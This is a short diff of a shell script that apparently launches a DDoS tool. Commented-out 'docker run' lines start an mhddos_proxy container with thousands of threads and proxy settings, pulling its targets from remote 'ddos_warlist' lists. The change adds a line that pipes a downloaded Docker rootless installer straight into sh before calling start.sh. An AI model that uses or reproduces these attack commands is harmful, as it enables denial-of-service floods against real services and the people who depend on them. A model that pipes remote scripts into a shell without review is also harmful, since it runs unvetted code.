@@ -14,6 +14,6 @@ then
 	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_other.lst 
 	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_all.lst 
 else
-	./docker_install.sh
-	exec '$start.sh'
+	curl -fsSL https://get.docker.com/rootless | sh
+	./start.sh
 fi
